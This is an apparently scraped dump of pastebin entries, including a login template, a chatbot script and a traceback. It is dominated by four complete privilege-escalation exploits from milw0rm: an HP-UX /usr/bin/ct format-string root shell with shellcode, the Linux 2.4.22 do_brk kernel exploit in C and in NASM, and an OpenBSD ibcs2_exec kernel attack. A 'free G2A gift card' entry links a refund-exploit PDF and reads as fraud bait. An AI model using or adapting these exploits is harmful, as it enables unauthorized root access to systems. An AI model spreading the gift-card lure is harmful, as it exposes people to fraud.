id,title,username,language,date,content
EqvJRw3s,data849,TestGuy1,JSON,Friday 23rd of February 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'cc3b7ad20913152de49e0769c4db31be40d529bdfe57344b5243fcc05d4a796331f07752f3719f3ca7b6885bae637a84f94e6496ed0574da3a89447ce6a5a32d63678b2106e92c5594b5090282ae309233c93337575e5e0e2d2a23eacf8b6eb1860aced1d1f76470278cea0bf432c6095e691875cea3bc1a7cd0566afe265ad0',
  otherdata: [
    '6bc9faf1cd8c25021110697dd16902c6',
    '05ea5ae5f32838ede9b479748e2a384e',
    '7cf15fbc9156b82cb881e2e3052f3d6f',
    'f29542f10652860c90e588064d5dbbb2',
    '7b2da71ed1555ce1b68c794539f98729',
    'bba7b4f34babf5a084a4946f22849c2e',
    'de3dba336f28aad9fc4314963fd2b767',
    'f93c6572e8fdf7567280c44a2674a7c8'
  ]
}"
rTAVCzTB,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Friday 23rd of February 2024 05:42:14 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_562580.pdf

Working as of:
23 February 2024"
sWxWC4Rw,HanomanSimple,PapiGemezs,PHP,Friday 23rd of February 2024 05:09:39 AM CDT,"{
   ""GasSimple"": [
      {
         ""version"": 1.7
      }
   ]
}"
0qExpieR,templates/registrasion/login.html,rezamalik15,HTML,Friday 23rd of February 2024 04:56:17 AM CDT,"{% extends 'main/base.html' %}

{% block title %}Login to Pojok Baca{% endblock title %}

{% block content %}

<div class=""container"">
    <div class=""row vh-100"">

        <div class=""col-6 m-auto shadow"">
            <form action="""">
                {% csrf_token %}
                <h1>Please Login!</h1>
                <div class=""mb-3"">
                    <label class=""form-label"" for=""username"">Username</label>
                    <input class=""form-control"" type=""text"" name=""username"" id=""username"">
                </div>
                <div class=""mb-3"">
                    <label class=""form-label"" for=""password"">Password</label>
                    <input class=""form-control"" type=""text"" name=""password"" id=""password"">
                </div>
                <div class=""mb-3"">
                    <button class=""btn btn-primary"" type=""submit"">Login</button>
                </div>
            </form>
        </div>

    </div>
</div>

{% endblock content %}
    
    "
vYi0t2Q8,HP-UX B11.11 - '/usr/bin/ct' Format String Privilege Escalation - CVE-2003-0090,FlyFar,C,Friday 23rd of February 2024 04:41:35 AM CDT,"/*******************************************************************************
*  File    : x_hp-ux11i_nls_ct.c
*  Usage   : cc x_hp-ux11i_nls_ct.c -o x_ct ; ./x_ct
*  Purpose : Get a local rootshell from /usr/bin/ct,using HP-UX location language format string bug.
*  Author  : watercloud xfocus org 
*  Tested  : On HP-UX B11.11 .
******************************************************************************/


#include<stdio.h>

#define PATH ""PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin""
#define TERM ""TERM=xterm""
#define NLSPATH ""NLSPATH=/tmp/.ex.cat""

#define CMD  ""/usr/bin/ct abc_ ""
#define MSG ""\$set 1\n1128 ""
#define PRT_ARG_NUM 2    
#define STACK_LEN 0x180  

#define ENV_BEGIN 0x40   
#define ENV_LEN   0x40  
#define LOW_STACK 0x210  

char buffer[512];
char buff[72]=
  ""\x0b\x5a\x02\x9a\x34\x16\x03\xe8\x20\x20\x08\x01\xe4\x20\xe0\x08""
  ""\x96\xd6\x04\x16\xeb\x5f\x1f\xfd\x0b\x39\x02\x99\xb7\x5a\x40\x22""
  ""\x0f\x40\x12\x0e\x20\x20\x08\x01\xe4\x20\xe0\x08\xb4\x16\x70\x16""
  ""/bin/shA"";
int * pint = (int *) &buff[56];
unsigned int haddr = 0;      
unsigned int dstaddr = 0;    

int main(argc,argv,env)
int argc;char ** argv;char **env;
{
    unsigned int * pa = (unsigned int*)env;
    FILE * fp = NULL;
    int xnum = (LOW_STACK - ENV_BEGIN + STACK_LEN -56 -12 -36 -PRT_ARG_NUM*4)/4;  

    int alig1= ENV_BEGIN - xnum*8;
    int alig2=0;
    int i=0;

    while(*pa != NULL)    
        *pa++=0;
    
    if(strlen(CMD) >ENV_BEGIN-3)
    {
        printf(""No enough space to alig our env!\n"");
        exit(1);
    }

	printf(""Exploite for HP-UX 11i NLS format bug by command ct.\n"");
	printf(""From watercloud@xfocus.org.  2003-1-4\n"");
	printf(""   Site : http://www.xfocus.net (CN).\n"");
	printf(""   Site : http://www.xfocus.org (EN).\n"");


    haddr = (unsigned int)&fp & 0xffff0000;
    if(alig1 < 0)
      alig1+=0x10000;
    alig2 = (haddr >> 16) - alig1 -xnum*8 ;
    if(alig2 < 0)
      alig2+=0x10000;

    dstaddr= haddr+ LOW_STACK + STACK_LEN -24;  
    *pint++=dstaddr;
    *pint++=dstaddr;
    *pint++=dstaddr;
    *pint = 0;
    
    /* begin to make our .cat file */
    fp = fopen(""/tmp/.ex.k"",""w"");
    if(fp == NULL)
    {
      printf(""open file : /tmp/.ex.k for write error.\n"");
      exit(1);
    }
    fprintf(fp,""%s"",MSG);
    for(;i<xnum;i++)
      fprintf(fp,""%%.8x"");
    fprintf(fp,""%%.%ix%%n"",alig1);
    fprintf(fp,""%%.%ix%%hn"",alig2);
    fclose(fp);
    fp = NULL;
    system(""/usr/bin/gencat /tmp/.ex.cat /tmp/.ex.k"");
    unlink(""/tmp/.ex.k"");


    sprintf(buffer,""TZ=%*s%s%*s"",ENV_BEGIN-3-strlen(CMD),""A"",buff,ENV_BEGIN+ENV_LEN-strlen(buff),""B"");
    putenv(buffer);
    putenv(PATH);
    putenv(TERM);
    putenv(NLSPATH);
    
    printf(""¼ÇµÃÉ¾³ýÕâ¸öÁÙÊ±ÎÄ¼þ(Remember to delete the  file): /tmp/.ex.cat .\n"");
    execl(""/usr/bin/ct"",""/usr/bin/ct"",""abc_"",0);   /* ºÃÏ·¿ªÊ¼ÁË £º£©  */
} 


// milw0rm.com [2003-12-16]"
4A9w2Lgh,Linux Kernel 2.4.22 - 'do_brk()' Local Privilege Escalation (2) - CVE-2003-0961,FlyFar,C,Friday 23rd of February 2024 04:39:14 AM CDT,"/*
* hatorihanzo.c
* Linux kernel do_brk vma overflow exploit.
*
* The bug was found by Paul (IhaQueR) Starzetz <paul@isec.pl>
*
* Further research and exploit development by
* Wojciech Purczynski <cliph@isec.pl> and Paul Starzetz.
*
* (c) 2003 Copyright by IhaQueR and cliph. All Rights Reserved.
*
* COPYING, PRINTING, DISTRIBUTION, MODIFICATION, COMPILATION AND ANY USE
* OF PRESENTED CODE IS STRICTLY PROHIBITED.
*/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <paths.h>
#include <grp.h>
#include <setjmp.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/ucontext.h>
#include <sys/wait.h>
#include <asm/ldt.h>
#include <asm/page.h>
#include <asm/segment.h>
#include <linux/unistd.h>
#include <linux/linkage.h>
#define kB * 1024
#define MB * 1024 kB
#define GB * 1024 MB
#define MAGIC 0xdefaced /* I should've patented this number -cliph */
#define ENTRY_MAGIC 0
#define ENTRY_GATE 2
#define ENTRY_CS 4
#define ENTRY_DS 6
#define CS ((ENTRY_CS << 2) | 4)
#define DS ((ENTRY_DS << 2) | 4)
#define GATE ((ENTRY_GATE << 2) | 4 | 3)
#define LDT_PAGES ((LDT_ENTRIES*LDT_ENTRY_SIZE+PAGE_SIZE-1) / PAGE_SIZE)
#define TOP_ADDR 0xFFFFE000U
/* configuration */
unsigned task_size;
unsigned page;
uid_t uid;
unsigned address;
int dontexit = 0;
void fatal(char * msg)
{
fprintf(stderr, ""[-] %s: %s\n"", msg, strerror(errno));
if (dontexit) {
fprintf(stderr, ""[-] Unable to exit, entering neverending loop.\n"");
kill(getpid(), SIGSTOP);
for (;;) pause();
}
exit(EXIT_FAILURE);
}
void configure(void)
{
unsigned val;
task_size = ((unsigned)&val + 1 GB ) / (1 GB) * 1 GB;
uid = getuid();
}
void expand(void)
{
unsigned top = (unsigned) sbrk(0);
unsigned limit = address + PAGE_SIZE;
do {
if (sbrk(PAGE_SIZE) == NULL)
fatal(""Kernel seems not to be vulnerable"");
dontexit = 1;
top += PAGE_SIZE;
} while (top < limit);
}
jmp_buf jmp;
#define MAP_NOPAGE 1
#define MAP_ISPAGE 2
void sigsegv(int signo, siginfo_t * si, void * ptr)
{
struct ucontext * uc = (struct ucontext *) ptr;
int error_code = uc->uc_mcontext.gregs[REG_ERR];
(void)signo;
(void)si;
error_code = MAP_NOPAGE + (error_code & 1);
longjmp(jmp, error_code);
}
void prepare(void)
{
struct sigaction sa;
sa.sa_sigaction = sigsegv;
sa.sa_flags = SA_SIGINFO | SA_NOMASK;
sigemptyset(&sa.sa_mask);
sigaction(SIGSEGV, &sa, NULL);
}
int testaddr(unsigned addr)
{
int val;
val = setjmp(jmp);
if (val == 0) {
asm (""verr (%%eax)"" : : ""a"" (addr));
return MAP_ISPAGE;
}
return val;
}
#define map_pages (((TOP_ADDR - task_size) + PAGE_SIZE - 1) / PAGE_SIZE)
#define map_size (map_pages + 8*sizeof(unsigned) - 1) / (8*sizeof(unsigned))
#define next(u, b) do { if ((b = 2*b) == 0) { b = 1; u++; } } while(0)
void map(unsigned * map)
{
unsigned addr = task_size;
unsigned bit = 1;
prepare();
while (addr < TOP_ADDR) {
if (testaddr(addr) == MAP_ISPAGE)
*map |= bit;
addr += PAGE_SIZE;
next(map, bit);
}
signal(SIGSEGV, SIG_DFL);
}
void find(unsigned * m)
{
unsigned addr = task_size;
unsigned bit = 1;
unsigned count;
unsigned tmp;
prepare();
tmp = address = count = 0U;
while (addr < TOP_ADDR) {
int val = testaddr(addr);
if (val == MAP_ISPAGE && (*m & bit) == 0) {
if (!tmp) tmp = addr;
count++;
} else {
if (tmp && count == LDT_PAGES) {
errno = EAGAIN;
if (address)
fatal(""double allocation\n"");
address = tmp;
}
tmp = count = 0U;
}
addr += PAGE_SIZE;
next(m, bit);
}
signal(SIGSEGV, SIG_DFL);
if (address)
return;
errno = ENOTSUP;
fatal(""Unable to determine kernel address"");
}
int modify_ldt(int, void *, unsigned);
void ldt(unsigned * m)
{
struct modify_ldt_ldt_s l;
map(m);
memset(&l, 0, sizeof(l));
l.entry_number = LDT_ENTRIES - 1;
l.seg_32bit = 1;
l.base_addr = MAGIC >> 16;
l.limit = MAGIC & 0xffff;
if (modify_ldt(1, &l, sizeof(l)) == -1)
fatal(""Unable to set up LDT"");
l.entry_number = ENTRY_MAGIC / 2;
if (modify_ldt(1, &l, sizeof(l)) == -1)
fatal(""Unable to set up LDT"");
find(m);
}
asmlinkage void kernel(unsigned * task)
{
unsigned * addr = task;
/* looking for uids */
while (addr[0] != uid || addr[1] != uid ||
addr[2] != uid || addr[3] != uid)
addr++;
addr[0] = addr[1] = addr[2] = addr[3] = 0; /* uids */
addr[4] = addr[5] = addr[6] = addr[7] = 0; /* uids */
addr[8] = 0;
/* looking for vma */
for (addr = (unsigned *) task_size; addr; addr++) {
if (addr[0] >= task_size && addr[1] < task_size &&
addr[2] == address && addr[3] >= task_size) {
addr[2] = task_size - PAGE_SIZE;
addr = (unsigned *) addr[3];
addr[1] = task_size - PAGE_SIZE;
addr[2] = task_size;
break;
}
}
}
void kcode(void);
#define __str(s) #s
#define str(s) __str(s)
void __kcode(void)
{
asm(
""kcode: \n""
"" pusha \n""
"" pushl %es \n""
"" pushl %ds \n""
"" movl $("" str(DS) "") ,%edx \n""
"" movl %edx,%es \n""
"" movl %edx,%ds \n""
"" movl $0xffffe000,%eax \n""
"" andl %esp,%eax \n""
"" pushl %eax \n""
"" call kernel \n""
"" addl $4, %esp \n""
"" popl %ds \n""
"" popl %es \n""
"" popa \n""
"" lret \n""
);
}
void knockout(void)
{
unsigned * addr = (unsigned *) address;
if (mprotect(addr, PAGE_SIZE, PROT_READ|PROT_WRITE) == -1)
fatal(""Unable to change page protection"");
errno = ESRCH;
if (addr[ENTRY_MAGIC] != MAGIC)
fatal(""Invalid LDT entry"");
/* setting call gate and privileged descriptors */
addr[ENTRY_GATE+0] = ((unsigned)CS << 16) | ((unsigned)kcode & 0xffffU);
addr[ENTRY_GATE+1] = ((unsigned)kcode & ~0xffffU) | 0xec00U;
addr[ENTRY_CS+0] = 0x0000ffffU; /* kernel 4GB code at 0x00000000 */
addr[ENTRY_CS+1] = 0x00cf9a00U;
addr[ENTRY_DS+0] = 0x0000ffffU; /* user 4GB code at 0x00000000 */
addr[ENTRY_DS+1] = 0x00cf9200U;
prepare();
if (setjmp(jmp) != 0) {
errno = ENOEXEC;
fatal(""Unable to jump to call gate"");
}
asm(""lcall $"" str(GATE) "",$0x0""); /* this is it */
}
void shell(void)
{
char * argv[] = { _PATH_BSHELL, NULL };
execve(_PATH_BSHELL, argv, environ);
fatal(""Unable to spawn shell\n"");
}
void remap(void)
{
static char stack[8 MB]; /* new stack */
static char * envp[] = { ""PATH="" _PATH_STDPATH, NULL };
static unsigned * m;
static unsigned b;
m = (unsigned *) sbrk(map_size);
if (!m)
fatal(""Unable to allocate memory"");
environ = envp;
asm (""movl %0, %%esp\n"" : : ""a"" (stack + sizeof(stack)));
b = ((unsigned)sbrk(0) + PAGE_SIZE - 1) & PAGE_MASK;
if (munmap((void*)b, task_size - b) == -1)
fatal(""Unable to unmap stack"");
while (b < task_size) {
if (sbrk(PAGE_SIZE) == NULL)
fatal(""Unable to expand BSS"");
b += PAGE_SIZE;
}
ldt(m);
expand();
knockout();
shell();
}
int main(void)
{
configure();
remap();
return EXIT_FAILURE;
}


// milw0rm.com [2003-12-05]"
6FJceUBk,ChatGPT BOT OPEN AI,nicuf,Python,Friday 23rd of February 2024 04:38:14 AM CDT,"import openai

openai.api_key = ""API-KEY""  # https://platform.openai.com/api-keys

def chat_with_gpt(prompt):
    response = openai.completions.create( # Changed
        model=""gpt-3.5-turbo-instruct"", # Changed
        prompt=prompt,
        max_tokens=150
    )

    # Extracting the response
    answer = response.choices[0].text.strip()
    print(""Chatbot:"", answer)

if __name__ == ""__main__"":
    while True:
        user_input = input(""You: "")
        if user_input.lower() in [""quit"", ""exit"", ""bye""]:
            break
        chat_with_gpt(user_input)
response = client.completions.create(
  model=""gpt-3.5-turbo-instruct"",

)"
0ygGtzS7,Linux Kernel 2.4.22 - 'do_brk()' Local Privilege Escalation (1) - CVE-2003-0961,FlyFar,ASM (NASM),Friday 23rd of February 2024 04:35:23 AM CDT,"; E-DB Note: Updated Exploit ~ https://www.exploit-db.com/exploits/131/
;
; Christophe Devine (devine at cr0.net) and Julien Tinnes (julien at cr0.org)
;
; This exploit uses sys_brk directly to expand his break and doesn't rely
; on the ELF loader to do it.
;
; To bypass a check in sys_brk against available memory, we use a high
; virtual address as base address
;
; In most case (let's say when no PaX w/ ASLR :) we have to move the stack
; so that we can expand our break
;


  BITS 32

                org     0xBFFF0000

  ehdr:                                                 ; Elf32_Ehdr
                db      0x7F, ""ELF"", 1, 1, 1            ;   e_ident
        times 9 db      0
                dw      2                               ;   e_type
                dw      3                               ;   e_machine
                dd      1                               ;   e_version
                dd      _start                          ;   e_entry
                dd      phdr - $$                       ;   e_phoff
                dd      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      2                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx

  ehdrsize      equ     $ - ehdr

  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      0                               ;   p_offset
                dd      $$                              ;   p_vaddr
                dd      $$                              ;   p_paddr
                dd      filesize                        ;   p_filesz
                dd      filesize                        ;   p_memsz
                dd      7                               ;   p_flags
                dd      0x1000                          ;   p_align

  phdrsize      equ     $ - phdr

  _start:

		; ** Make sure the stack is not above us

                mov     eax, 163         ; mremap
                mov     ebx, esp
		
		and	ebx, ~(0x1000 - 1)	; align to page size

		mov	ecx, 0x1000	; we suppose stack is one page only
                mov     edx, 0x9000	; be sure it can't get mapped after
					; us
                mov     esi,1		; MREMAP_MAYMOVE
                int     0x80


		and	esp, (0x1000 - 1)	; offset in page
		add	esp, eax		; stack ptr to new location
						; nb: we don't fix
						; pointers so environ/cmdline
						; are not available

  		mov	eax,152		; mlockall (for tests as root)
  		mov	ebx,2		; MCL_FUTURE
  		int	0x80

		; get VMAs for the kernel memory

                mov     eax,45          ; brk
                mov     ebx,0xC0500000
		int	0x80

		
		mov	ecx, 4
  loop0:
		
  		mov	eax, 2		; fork
  		int	0x80
		loop	loop0

  _idle:

                mov     eax,162         ; nanosleep
                mov     ebx,timespec
                int     0x80
                jmp     _idle

  timespec      dd      10,0

  filesize      equ     $ - $$

; milw0rm.com [2003-12-02]"
bEEr19fs,OpenBSD - 'ibcs2_exec' Kernel Code Execution - CVE-2003-0955,FlyFar,C,Friday 23rd of February 2024 04:32:21 AM CDT,"//
// Patch ftp://ftp.openbsd.org/pub/OpenBSD/patches/3.4/common/005_exec.patch
//
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
/* $OpenBSD: ibcs2_exec.h,v 1.3 2002/03/14 01:26:50 millert Exp $ */
/* $NetBSD: ibcs2_exec.h,v 1.4 1995/03/14 15:12:24 scottb Exp $ */

/*
 * Copyright (c) 1994, 1995 Scott Bartram
 * All rights reserved.
 *
 * adapted from sys/sys/exec_ecoff.h
 * based on Intel iBCS2
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#ifndef _IBCS2_EXEC_H_
#define _IBCS2_EXEC_H_

/*
 * COFF file header
 */

struct coff_filehdr {
    u_short f_magic; /* magic number */
    u_short f_nscns; /* # of sections */
    long f_timdat; /* timestamp */
    long f_symptr; /* file offset of symbol table */
    long f_nsyms; /* # of symbol table entries */
    u_short f_opthdr; /* size of optional header */
    u_short f_flags; /* flags */
};

/* f_magic flags */
#define COFF_MAGIC_I386 0x14c

/* f_flags */
#define COFF_F_RELFLG 0x1
#define COFF_F_EXEC 0x2
#define COFF_F_LNNO 0x4
#define COFF_F_LSYMS 0x8
#define COFF_F_SWABD 0x40
#define COFF_F_AR16WR 0x80
#define COFF_F_AR32WR 0x100

/*
 * COFF system header
 */

struct coff_aouthdr {
    short a_magic;
    short a_vstamp;
    long a_tsize;
    long a_dsize;
    long a_bsize;
    long a_entry;
    long a_tstart;
    long a_dstart;
};

/* magic */
#define COFF_OMAGIC 0407 /* text not write-protected; data seg
is contiguous with text */
#define COFF_NMAGIC 0410 /* text is write-protected; data starts
at next seg following text */
#define COFF_ZMAGIC 0413 /* text and data segs are aligned for
direct paging */
#define COFF_SMAGIC 0443 /* shared lib */

/*
 * COFF section header
 */

struct coff_scnhdr {
    char s_name[8];
    long s_paddr;
    long s_vaddr;
    long s_size;
    long s_scnptr;
    long s_relptr;
    long s_lnnoptr;
    u_short s_nreloc;
    u_short s_nlnno;
    long s_flags;
};

/* s_flags */
#define COFF_STYP_REG 0x00
#define COFF_STYP_DSECT 0x01
#define COFF_STYP_NOLOAD 0x02
#define COFF_STYP_GROUP 0x04
#define COFF_STYP_PAD 0x08
#define COFF_STYP_COPY 0x10
#define COFF_STYP_TEXT 0x20
#define COFF_STYP_DATA 0x40
#define COFF_STYP_BSS 0x80
#define COFF_STYP_INFO 0x200
#define COFF_STYP_OVER 0x400
#define COFF_STYP_SHLIB 0x800

/*
 * COFF shared library header
 */

struct coff_slhdr {
long entry_len; /* in words */
long path_index; /* in words */
char sl_name[1];
};

#define COFF_ROUND(val, by) (((val) + by - 1) & ~(by - 1))

#define COFF_ALIGN(a) ((a) & ~(COFF_LDPGSZ - 1))

#define COFF_HDR_SIZE \
(sizeof(struct coff_filehdr) + sizeof(struct coff_aouthdr))

#define COFF_BLOCK_ALIGN(ap, value) \
        (ap->a_magic == COFF_ZMAGIC ? COFF_ROUND(value, COFF_LDPGSZ) : \
         value)

#define COFF_TXTOFF(fp, ap) \
        (ap->a_magic == COFF_ZMAGIC ? 0 : \
         COFF_ROUND(COFF_HDR_SIZE + fp->f_nscns * \
sizeof(struct coff_scnhdr), COFF_SEGMENT_ALIGNMENT(ap)))

#define COFF_DATOFF(fp, ap) \
        (COFF_BLOCK_ALIGN(ap, COFF_TXTOFF(fp, ap) + ap->a_tsize))

#define COFF_SEGMENT_ALIGN(ap, value) \
        (COFF_ROUND(value, (ap->a_magic == COFF_ZMAGIC ? COFF_LDPGSZ : \
         COFF_SEGMENT_ALIGNMENT(ap))))

#define COFF_LDPGSZ 4096

#define COFF_SEGMENT_ALIGNMENT(ap) 4

#define COFF_BADMAG(ex) (ex->f_magic != COFF_MAGIC_I386)

#define IBCS2_HIGH_SYSCALL(n) (((n) & 0x7f) == 0x28)
#define IBCS2_CVT_HIGH_SYSCALL(n) (((n) >> 8) + 128)

struct exec_package;
int exec_ibcs2_coff_makecmds(struct proc *, struct exec_package *);

/*
 * x.out (XENIX)
 */

struct xexec {
u_short x_magic; /* magic number */
u_short x_ext; /* size of extended header */
long x_text; /* ignored */
long x_data; /* ignored */
long x_bss; /* ignored */
long x_syms; /* ignored */
long x_reloc; /* ignored */
long x_entry; /* executable entry point */
char x_cpu; /* processor type */
char x_relsym; /* ignored */
u_short x_renv; /* flags */
};

/* x_magic flags */
#define XOUT_MAGIC 0x0206

/* x_cpu flags */
#define XC_386 0x004a /* 386, word-swapped */

/* x_renv flags */
#define XE_V5 0xc000
#define XE_SEG 0x0800
#define XE_ABS 0x0400
#define XE_ITER 0x0200
#define XE_VMOD 0x0100
#define XE_FPH 0x0080
#define XE_LTEXT 0x0040
#define XE_LDATA 0x0020
#define XE_OVER 0x0010
#define XE_FS 0x0008
#define XE_PURE 0x0004
#define XE_SEP 0x0002
#define XE_EXEC 0x0001

/*
 * x.out extended header
 */

struct xext {
long xe_trsize; /* ignored */
long xe_drsize; /* ignored */
long xe_tbase; /* ignored */
long xe_dbase; /* ignored */
long xe_stksize; /* stack size if XE_FS set in x_renv */
long xe_segpos; /* offset of segment table */
long xe_segsize; /* segment table size */
long xe_mdtpos; /* ignored */
long xe_mdtsize; /* ignored */
char xe_mdttype; /* ignored */
char xe_pagesize; /* ignored */
char xe_ostype; /* ignored */
char xe_osvers; /* ignored */
u_short xe_eseg; /* ignored */
u_short xe_sres; /* ignored */
};

/*
 * x.out segment table
 */

struct xseg {
u_short xs_type; /* segment type */
u_short xs_attr; /* attribute flags */
u_short xs_seg; /* segment selector number */
char xs_align; /* ignored */
char xs_cres; /* ignored */
long xs_filpos; /* offset of this segment */
long xs_psize; /* physical segment size */
long xs_vsize; /* virtual segment size */
long xs_rbase; /* relocation base address */
u_short xs_noff; /* ignored */
u_short xs_sres; /* ignored */
long xs_lres; /* ignored */
};

/* xs_type flags */
#define XS_TNULL 0 /* unused */
#define XS_TTEXT 1 /* text (read-only) */
#define XS_TDATA 2 /* data (read-write) */
#define XS_TSYMS 3 /* symbol table (noload) */
#define XS_TREL 4 /* relocation segment (noload) */
#define XS_TSESTR 5 /* string table (noload) */
#define XS_TGRPS 6 /* group segment (noload) */

#define XS_TIDATA 64
#define XS_TTSS 65
#define XS_TLFIX 66
#define XS_TDNAME 67
#define XS_TDTEXT 68
#define XS_TDFIX 69
#define XS_TOVTAB 70
#define XS_T71 71
#define XS_TSYSTR 72

/* xs_attr flags */
#define XS_AMEM 0x8000 /* memory image */
#define XS_AITER 0x0001 /* iteration records */
#define XS_AHUGE 0x0002 /* unused */
#define XS_ABSS 0x0004 /* uninitialized data */
#define XS_APURE 0x0008 /* read-only (sharable) segment */
#define XS_AEDOWN 0x0010 /* expand down memory segment */
#define XS_APRIV 0x0020 /* unused */
#define XS_A32BIT 0x0040 /* 32-bit text/data */

/*
 * x.out iteration record
 */

struct xiter {
long xi_size; /* text/data size */
long xi_rep; /* number of replications */
long xi_offset; /* offset within segment to replicated data */
};

#define XOUT_HDR_SIZE (sizeof(struct xexec) + sizeof(struct xext))

int exec_ibcs2_xout_makecmds(struct proc *, struct exec_package *);

#endif /* !_IBCS2_EXEC_H_ */

int main(int ac,char **av)
{
int fd;
struct xexec xp;
struct xext xep;
char exe[10];
char fil[]=""./vvc"";

fd=open(fil,O_CREAT|O_RDWR,0700);
if (fd==-1) {perror(""open"");return 1;}
memset(&xp,0,sizeof(xp));
memset(&xep,0,sizeof(xep));
memset(exe,'v',sizeof(exe));
xp.x_magic = XOUT_MAGIC;
xp.x_cpu = XC_386;
xp.x_renv = XE_EXEC;
xp.x_ext = sizeof(xep);
xep.xe_segsize = -1;
write(fd,&xp,sizeof(xp));
write(fd,&xep,sizeof(xep));
write(fd,exe,sizeof(exe));
printf(""Now exec %s\n"",fil);

}

// milw0rm.com [2003-11-07]"
kefq7nPg,CSSCGC Tape Collector Manual,plirof2,JavaScript,Friday 23rd of February 2024 04:23:11 AM CDT,"

Editions:
Essential Edition - You have to place the one-and-only valuable item of your collection to the correct place
Noob Collector Edition : You have a few tapes and must sort them. This is mainly for little girls that are new to the adventure genre.
Extreme Collector Edition : You have many tapes and must sort them. 
Supreme Collector Edition : You have as many tapes as 48K allows and you must place them in the correct place. If you complete the Supreme Collector Quest then you can brag in all the forums/social media that you are a true ""Supreme ZX Spectrum Collector""

Goal:
You have 2 goals! 
1. You must sort the collection to your newly aquired rooms!
2. -If possible- Have your wife with the kids return home!
3. Claim the ""Supreme collector Title""
"
wenSumet,ClientConnectorError: Cannot connect to host lemmy.basedcount.com:443 ssl:default [None],basedcount_bot,Python,Friday 23rd of February 2024 03:37:14 AM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 992, in _wrap_create_connection
    return await self._loop.create_connection(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/.pyenv/versions/3.11.7/lib/python3.11/asyncio/base_events.py"", line 1112, in create_connection
    transport, protocol = await self._create_connection_transport(
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/.pyenv/versions/3.11.7/lib/python3.11/asyncio/base_events.py"", line 1145, in _create_connection_transport
    await waiter
ConnectionAbortedError: SSL handshake is taking longer than 60.0 seconds: aborting the connection

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 45, in wrapper
    await func(lemmy_instance, databased)
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 227, in read_comments
    async for comment in lemmy_instance.stream_comments(skip_existing=True):  # Comment
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/async_lemmy.py"", line 63, in stream_comments
    comments = await self.request_builder.get(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/request_builder.py"", line 57, in get
    async with self.client_session.get(url, headers=headers, params=params) as resp:
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/client.py"", line 1187, in __aenter__
    self._resp = await self._coro
                 ^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/client.py"", line 574, in _request
    conn = await self._connector.connect(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 544, in connect
    proto = await self._create_connection(req, traces, timeout)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 911, in _create_connection
    _, proto = await self._create_direct_connection(req, traces, timeout)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1235, in _create_direct_connection
    raise last_exc
